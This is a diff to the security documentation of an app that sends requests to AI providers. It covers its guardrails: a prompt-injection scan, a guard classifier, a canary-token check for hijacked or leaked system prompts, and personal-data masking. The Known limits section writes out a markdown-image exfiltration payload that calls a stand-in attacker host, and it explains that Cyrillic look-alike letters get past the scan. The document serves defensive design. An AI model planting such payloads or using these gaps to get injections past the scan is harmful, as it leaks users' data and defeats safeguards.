@@ -14,10 +14,64 @@ module, `crema/client.py`, in exactly three functions: `_complete` (chat calls),
 connection check). The key never leaves that module, and never enters redis or any
 other cache.
 
-The HTTP surface refuses the internal interfaces `security` and `advanced_ocr`.
-They are reachable from Python code only.
+The HTTP surface refuses the internal interface `advanced_ocr`. It is reachable
+from Python code only.
 
-## Layer 1 — the scan
+## Guardrails
+
+The security checks are one ordered list: the **Guardrails** page in the desk. Each
+row is one check. The rows run from top to bottom on the way to the provider. Drag a
+row to change the order. Add a row to run a check again, or to add a check another
+app installed. Delete a row to stop running it — a deleted row has the same effect
+as `Off`, and a deleted built-in row does not come back on a later migrate. Some
+checks also undo their own work on the reply: masking puts the real values back, and
+the trap removes its token. That undo runs in reverse row order, automatically, and
+only for the rows that ran on the way in.
+
+The same check can appear on more than one row — two AI Guard rows checked by
+different services, or two of the same masking row filtered to different use cases.
+Each row keeps its own state; they do not share one verdict or one vault.
+
+Order carries meaning. The AI Guard makes a provider call of its own, so a Hide row
+above it masks what the guard sees, and a Hide row below it does not. The shipped
+default keeps both Hide rows above the AI Guard — move one below it and that guard
+receives unmasked content.
+
+Each row has an **Action** and a **Use Cases** filter:
+
+| Action | Meaning |
+|---|---|
+| `Off` | The check does not run. |
+| `Log Only` | A finding is recorded on the Crema Log row; the call proceeds. |
+| `Retry Once` | One fresh attempt, then stop. Only the Reply Check retries; the other checks treat this as `Block`. |
+| `Block` | The call fails with a blocked-call error, and the log records a `Blocked` row. |
+
+Leave **Use Cases** empty to run the check for every use case, or list use-case keys
+separated by commas to limit it. The filter always reads the use case the caller
+asked for — a call served by a fallback keeps the requested use case's guardrails.
+
+Two positions in the list are fixed by design. The Text Scan runs before the answer
+cache and the budget check, so a cached reply can never bypass it — it is free and
+fails closed. Every other check runs after the cache and the budget check, so a
+cached or budget-stopped call never pays for a guard model call.
+
+Two checks cannot reach audio: there is no text to scan or mask before the sound is
+sent. For the Transcribe use case, only a Hide guardrail set to `Block` has an
+effect — it refuses the call. A locally hosted model is the only real control for
+audio content.
+
+**Escalation.** Crema ships one standard Notification, "Crema blocked a call",
+disabled by default. Enable it to alert a role or a person each time a `Blocked` row
+lands in the Crema Log; edit its recipients, channel, and condition like any other
+Notification.
+
+**Your own guardrail.** Another app can add a check — an external toxicity API, a
+stronger PII detector — through the `crema_guardrails` hook
+([docs/configure.md](configure.md#add-your-own-guardrail)). Run a heavy detection
+model behind that hook, or behind an LLM gateway a provider entry points at. Crema
+stays the policy and audit layer.
+
+## The scan — Text Scan
 
 The scan is a local regex and unicode check. It runs before any network call. It
 reads the prompt, the context, and any `history` turns together, because an attack
@@ -46,30 +100,47 @@ patterns. This check reads the raw text, not the canonical text. The scan blocks
 outright when it finds a match. This is a fail-closed check: the scan blocks an unclear
 case, it never passes one through.
 
-Turn the scan off per interface with `enable_prompt_scan` (**Text Scan** in the desk).
-It is on by default.
+The scan is the **Text Scan** row on the Guardrails page. It is on (`Block`) for
+every use case by default. `Log Only` records a hit on the log row instead of
+blocking; use it to measure false positives on a use case before you decide.
 
-## Layer 2 — the guard
+## The guard — AI Guard
 
-The guard is optional. Turn it on per interface with `enable_llm_guard` (**AI Guard**
-in the desk). The guard
-sends the prompt and the context together through the `security` interface, and
-reads back a risk label: benign, suspicious, or malicious. A malicious label blocks
-the call.
+The guard is optional: the **AI Guard** row on the Guardrails page, off by default.
+It sends the request's user text to a second model and reads back a risk label:
+benign, suspicious, or malicious. A malicious label follows the row's Action —
+`Block` fails the call, `Log Only` records the verdict and lets the call proceed,
+and `Retry Once` counts as `Block`. A suspicious label is recorded on the log row
+and the call proceeds.
+
+The row carries the guard's own instructions (**Guard Instructions** — edit them to
+tune the classifier) and its own AI service and model (**Checked By** / **Guard
+Model**, Crema Settings' Default Provider and Default Model when either is empty).
+The guard is a check, not a use case — it never borrows an interface's provider,
+budget, standing instructions, or Runs As account, only a place to send the request.
+The guard's tokens and cost land on the calling use case's own log row — a guarded
+call shows two model calls on one row — and count against the calling use case's
+budget, not the guard's own.
 
 The guard fails open: if the guard call errors, or its reply cannot be read, the
-original call proceeds. The scan and Frappe's own permission checks are the hard
-fence. The guard adds a second opinion, not a second fence.
+original call proceeds and the log row records that it did. The scan and Frappe's
+own permission checks are the hard fence. The guard adds a second opinion, not a
+second fence.
 
-Two failures are not guard errors, and do not fail open. If the scan (layer 1)
-blocks the content inside the guard's own call, the original call is blocked too —
-the scan always fails closed, also when the guard is what ran it. If the `security`
-interface cannot resolve at all, the call fails loudly with a configuration error.
-Crema Settings rejects `enable_llm_guard` at save time unless the `security`
-interface has an enabled provider, so this state means the configuration changed
-after the save.
+Two failures are not guard errors, and do not fail open. The scan always runs on the
+guard's own payload first and fails closed, whatever the row's Action. If
+the row's effective provider cannot resolve at all — no **Checked By**, and no
+Default Provider either — the call fails loudly with a configuration error; the
+Guardrails page rejects that state at save time for every AI Guard row that is not
+`Off`, so reaching it at call time means the configuration changed after the save.
 
-## Layer 3 — the output trap
+The guard never checks the OCR, Advanced OCR, and Transcribe use cases (their
+content is document text and audio, which the classifier is not tuned for), and it
+structurally cannot
+check itself — its own call goes straight to the provider, outside the guardrail
+list.
+
+## The trap — Reply Check
 
 The trap sends a per-call random token along with the request, and asks the model to
 echo it back — on its own last line for a plain-text reply, or as a `"_crema"` key for
@@ -78,27 +149,89 @@ system prompt (a hijack). A token that appears a second time, somewhere else in 
 reply, means the model is echoing that system prompt back (a leak).
 
 Unlike the scan and the guard, the trap does not read the prompt or the context at
-all — it only reads what comes back. That makes it the only layer that also covers
-`ocr()` and `extract()`, which skip the scan and the guard on purpose because both are
+all — it only reads what comes back. That makes it the only check that also covers
+`ocr()` and `extract()`, which skip the scan and the guard on purpose: both are
 tuned for user prompts and false-positive on arbitrary document text. `transcribe()`
-is the one entry point with none of the three layers: it has no system prompt to
-protect, so the trap has nothing to arm. The sandbox, the budget check, and the
-audit log are its fences.
+runs with no scan, no guard, and no trap — it has no system prompt to protect, so
+the trap has nothing to arm. The sandbox, the budget check, and the audit log are
+its fences.
 
-Set `output_trap` (**Reply Check** in the desk) per interface to one of:
+The trap is the **Reply Check** row on the Guardrails page, `Block` for every use
+case by default. Its Action follows the shared ladder: `Log Only` records a miss on
+the log row, `Retry Once` makes one fresh attempt with a new token and treats a
+second miss as `Block`, `Block` fails the call with a `Blocked` log row. If a model
+turns out to drop the token on ordinary, non-adversarial replies, step it down to
+`Log Only` — the Crema Log's `trap:`-prefixed detail rows show how often it happens
+before you decide — or filter the row to the use cases where it behaves.
 
-| Value | On a miss |
-|---|---|
-| `Off` | The system sends no token. No added cost. |
-| `Log Only` | The reply comes back as normal; the Crema Log row's `detail` records the miss. |
-| `Retry Once` | One fresh attempt, with a new token. A second miss counts as `Block`. |
-| `Block` | The call fails with a blocked-call error, and the log records a `Blocked` row. |
+## Masking (Experimental)
 
-A freshly-reconciled row defaults to `Block`. A row whose `output_trap` value is
-empty — a row from before the field existed, or a cleared value — runs with the trap
-`Off`; pick a value explicitly. If a model turns out to drop the token on ordinary,
-non-adversarial replies, step that interface down to `Log Only` — the Crema Log's
-`trap:`-prefixed detail rows show how often it happens before you decide.
+Two Guardrails rows hide sensitive values before the request leaves the server, and
+swap the real values back into the reply. The provider never sees the original text;
+it sees only a placeholder — `[[EMAIL_1]]`, `[[NAME_2]]`, `[[PHI_3]]` — and works
+with the shape of the document around it. Both rows are off by default.
+
+Masking is pseudonymisation, not anonymisation: the real values stay on this server,
+mapped to their placeholders for the length of the call. It is not a legal or
+compliance control — under data-protection rules of the GDPR kind, pseudonymised
+data is still personal data, because the map back exists. A requirement that data
+must not reach a given provider needs a data-processing agreement or a self-hosted
+model, not a mask. What masking gives is narrower: less sensitive data lands in the
+provider's own logs and prompt caches.
+
+**Hide Personal Information** covers who people are and how to reach them.
+Detection is layered, not one regex. Emails, phone numbers, IBANs, card numbers,
+IP addresses, and a Mauritian-shaped national ID are matched by pattern. A heuristic
+sweep catches a capitalised name the patterns have no rule for. For `transform()`,
+and for an automation task's Document Query sources, the record supplies exact terms
+too: the record's own title, the name and title of every record it links to, and its
+phone and email fields. That record read runs under the interface's own isolation
+user, so a value that user cannot read never enters the placeholder list. The other
+entry points — `ask()`, `ask_json()`, `extract()`, `ocr()` — have no record to read,
+so they rely on the patterns and the sweep alone. The site's default Company is
+never masked, so your own organisation's name stays readable in every prompt.
+
+Two or more surface forms of one value — "Mr Ramgoolam" and "Jean-Claude
+Ramgoolam" — get linked placeholders (`[[NAME_1]]`, `[[NAME_1.2]]`) rather than one
+merged placeholder. The swap back stays exact, and one added system line tells the
+model which placeholders refer to the same value.
+
+**Hide Health Information** covers what people are treated for. It is a keyword and
+pattern list — common conditions, medications, and procedures — matched
+case-insensitively, with spelling variants of one term linked the same way. It is a
+keyword list, not a health-information detector: it hides the words on the list so a
+provider cannot pair a person with a health fact, and it misses anything phrased
+outside the list. A site that needs clinical-grade detection should plug a dedicated
+detector in as its own guardrail (see
+[docs/configure.md](configure.md#add-your-own-guardrail)).
+
+The built-in list is English only. A site running in another language adds its own
+words under **Health Words** (see [docs/configure.md](configure.md#health-words)) —
+by hand, or proposed by the Translation use case for a chosen language. A proposed
+word is filed switched off: the app never turns one on itself, because an
+over-matching word tokenises ordinary text, and on a `Block` row an unresolved token
+fails the whole call. Two limits hold whatever language the list is in: a word list
+still isn't a detector, and every term is matched as written — a French plural or a
+Russian case ending still evades it, the same way an English word outside the list
+does today.
+
+Detection over-catches rather than under-catches. The swap back is exact, so a
+placeholder over a harmless value only costs the model some comprehension, while a
+missed value leaves the server. The false positives this trades away are listed
+under [Known limits](#known-limits).
+
+Each row's Action decides what a placeholder that does not come back means. `Log
+Only` records the miss on the log row and returns the restored reply — every
+placeholder that did come back is swapped for its real value. `Block` fails the call
+with a `Blocked` log row. `Retry Once` has no meaning for masking and counts as
+`Block`. Two channels cannot be masked at all, because there is no text to hide
+anything in: an image handed to a vision model, and audio handed to `transcribe()`.
+`Block` refuses those outright; `Log Only` sends them unmasked and records that it
+did.
+
+The rows are marked Experimental because the detection heuristics, the placeholder
+format, the health keyword list, and the grouping rule may all still change. Nothing
+else in Crema depends on them.
 
 ## The sandbox
 
@@ -140,12 +273,13 @@ that for this account exactly as for any other.
 Every interface with no provider of its own resolves through Crema Settings'
 `default_provider`/`default_model`/`default_isolation_user` before falling back per the
 chain in [configure.md](configure.md#reference--interfaces-and-the-fallback-chain).
-That includes `security` — once `default_provider` is set, `security` counts as
-configured even with no row of its own, so `enable_llm_guard` becomes available on
-every interface without a separate step.
+Once `default_provider` is set, an AI Guard row with no **Checked By** of its own
+counts as configured too, so the guard becomes available without a separate step.
 
 A fallback walk never weakens a call. The requested interface keeps its own prompt
-and its own scan/guard/trap settings; the fallback lends only its provider, model,
+and its own guardrails — every row is matched against the use case the caller asked
+for, so there is no per-row posture a fallback could lend or lose; the fallback
+lends only its provider, model,
 isolation user, and billing identity. See
 [configure.md](configure.md#reference--interfaces-and-the-fallback-chain).
 
@@ -157,11 +291,12 @@ just the calling user's name.
 
 Every call that reaches the provider writes one row to the Crema Log. A cached hit
 writes its own row too (`status = Cached`), so hit rate is computable from the log
-alone. Some calls write more than one row: a guarded call writes the guard's own
-`security` row beside the main row, and a guard that errors, or answers in a shape
-the system cannot read, writes one extra row on the main interface recording the
-fail-open. An OCR call that escalates to `advanced_ocr` still writes one row, but
-its `llm_calls` says 2 — both provider calls are billed under it.
+alone. A guarded call writes only the calling interface's own row — the guard's
+tokens and cost fold into it (`llm_calls` says 2), and a guard that errors, or
+answers in a shape the system cannot read, adds a note on the same row recording the
+fail-open rather than a row of its own. An OCR call that escalates to `advanced_ocr`
+still writes one row, but its `llm_calls` says 2 — both provider calls are billed
+under it.
 
 | Field | Notes |
 |---|---|
@@ -372,18 +507,35 @@ known vulnerability inside that range, the pin flags the range itself.
   the individual records that trip the scan and reports the count in `last_result`,
   rather than failing the whole run. Without that, one odd record would block the
   batch, and five such runs would turn the task off. This per-record drop runs only
-  when the interface's `enable_prompt_scan` is on. There is no such per-record drop for
-  `ask(files=[...])`: one file that trips the scan stops that call.
+  when the Text Scan row applies to the task's use case. There is no such per-record
+  drop for `ask(files=[...])`: one file that trips the scan stops that call.
 - The scan folds many, but not all, look-alike letters. It changes each letter to the
   Latin letters that give its sound, not to the Latin letter it looks like. The two
   agree for most look-alikes, but not for all of them: the Cyrillic letter "es" looks
   like a Latin "c" but gives "s", and the Cyrillic letter "er" looks like a Latin "p"
   but gives "r". A word spelled with one of these letters still evades every pattern.
   To close this needs a confusables table, which Crema does not have.
-- The output trap depends on the model actually following the instruction to echo the
-  token. A model that drops it on ordinary replies produces a false block on
-  `output_trap = Block`. There is no way to tell that apart from a real hijack
-  syntactically; the Crema Log is what makes the real rate visible.
+- The trap depends on the model actually following the instruction to echo the
+  token. A model that drops it on ordinary replies produces a false block when the
+  Reply Check row is set to `Block`. There is no way to tell that apart from a real
+  hijack syntactically; the Crema Log is what makes the real rate visible.
+- Masking over-catches by design: an ordinary two-word place name can mask like a
+  person's name, and a sentence-initial word next to a real name can be swept in
+  with it. The swap back is exact, so the reply still reads correctly — the cost is
+  model comprehension, not correctness.
+- Hide Health Information hides only the terms on its keyword list (the built-in
+  English list plus any Health Words a site adds). A health fact phrased outside the
+  list, in any language, reaches the provider unmasked.
+- Masking is a text-only control. An image or an audio file has no text to mask, so
+  it reaches the provider as-is unless a Hide row set to `Block` refuses the call.
+- Crema's own desk UI escapes every model reply before it touches the page. An app
+  that embeds Crema and renders a reply as markdown or HTML re-opens the channel that
+  escaping closes: a reply carrying `![](https://attacker/?d=...)` makes the browser
+  send data to a third party on render, with no click. The scan does not block
+  markdown images on the way in, because legitimate documents carry them (see
+  `security.py`'s own note). An embedding app must strip or allow-list image and link
+  targets before it renders a reply — the output-side content filter hook under
+  [Planned hardening](#planned-hardening) is the future home for that.
 
 ## Planned hardening
 
@@ -394,7 +546,7 @@ guarantee this page already states.
   loopback addresses (or an allow-listed egress proxy), closing the redirect-following
   gap the Known limits section above describes.
 - **Per-app scan patterns.** An installed app can register a new interface through
-  `crema_interfaces`, but has no way to add its own injection patterns to layer 1 —
+  `crema_interfaces`, but has no way to add its own injection patterns to the scan —
   `security.scan` has to stay free of any Frappe import, so this has to be a
   caller-side merge one level up (the same shape `_scan_context` already uses for
   `history`), not a hooks lookup inside `scan()` itself.
@@ -402,7 +554,23 @@ guarantee this page already states.
   API key out of error text — never the model's reply. A consuming app that needs a
   PII or secret-term filter on every response runs its own regex layer today; Crema
   has no equivalent hook.
-- **Layer 1 evasion resistance**, in order of value per unit of false-positive risk
+- **A user-scoped response cache.** The response cache is addressed by content hash
+  alone — interface, model, system prompt, prompt, context, and history, but no user
+  and no permission state. A reply cached for one user is served to any other user
+  who produces the identical resolved prompt. Context assembly runs under the
+  interface's isolation user, so an identical prompt implies identical readable
+  inputs — but that argument holds only while it is written down and tested, and it
+  says nothing about the second, smaller gap: the hash carries the *resolved*
+  interface name, so two requested interfaces that fall back to the same provider and
+  share a system prompt collide into one cache entry. The fix shape: add the session
+  user (or a hash of the user's effective permissions) and the requested interface
+  name to the cache key, or record precisely why each omission is safe.
+- **Version stamping in audit rows.** A log row records the *configured* model id,
+  never the model the provider actually served (`response.model` is read nowhere), and
+  no crema app version. A silent provider-side model bump changes behaviour with no
+  trail, and an incident cannot be replayed against the exact stack that produced it.
+  Record both, and add the new fields to the log's tamper-evident `CHAIN_FIELDS`.
+- **Scan evasion resistance**, in order of value per unit of false-positive risk
   added:
   1. *Homoglyph folding — shipped, partially.* The look-alike-letter gap this page's
      Known limits section describes: closing the rest needs a Unicode confusables-
@@ -425,13 +593,13 @@ guarantee this page already states.
   6. *A false-positive corpus and a shadow mode*, needed before any of 2–5 ship live:
      a fixture set of ordinary business text that must stay clean, and a per-pattern
      shadow flag that logs a "would have blocked" Crema Log row instead of raising —
-     the same `Log Only` → `Block` ladder `output_trap` already uses.
+     the same `Log Only` → `Block` ladder every Guardrails row already uses.
   7. *Language coverage* — every pattern today is English phrasing; a static
      per-language pattern table is a data addition, not an architecture change, since
      `scan()` has to stay free of a `frappe.local.lang` lookup.
-  8. *Not planned:* matching an LLM classifier's paraphrase recall in regex. Layer 1
-     is meant to be the cheap, deterministic, offline pre-filter; genuine semantic
-     paraphrase is layer 2's job.
+  8. *Not planned:* matching an LLM classifier's paraphrase recall in regex. The
+     scan is meant to be the cheap, deterministic, offline pre-filter; genuine
+     semantic paraphrase is the guard's job.
 
 ## Add a new scan pattern
 
